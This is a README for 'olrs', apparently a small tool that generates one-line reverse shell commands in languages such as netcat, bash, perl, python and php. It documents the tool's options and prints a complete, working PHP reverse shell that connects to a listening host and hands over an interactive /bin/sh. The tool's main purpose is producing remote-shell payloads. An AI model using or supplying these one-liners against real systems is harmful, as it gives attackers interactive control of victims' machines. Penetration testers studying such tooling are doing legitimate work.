# olrs
one line reverse shells

# usage

`$ chmod +x olrs`

#### olrs will check for `RS_HOST` ENV variable first and use it if no host is provided

`export RS_HOST=10.0.0.1 >> ~/.bashrc && source ~/.bashrc`

`$ ./olrs -l php -p 1337`

#### if no RS_HOST ENV variable

`$./olrs -l php -h 10.0.0.1 -p 1337`

#### prints 
`$ php -r '$sock=fsockopen("10.0.0.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`


# options

* `[-l language] nc | ncs (netcat without execute) | perl | ruby | bash | xterm | python | php`
* `[-h host]`
* `[-p port]` default = 1337
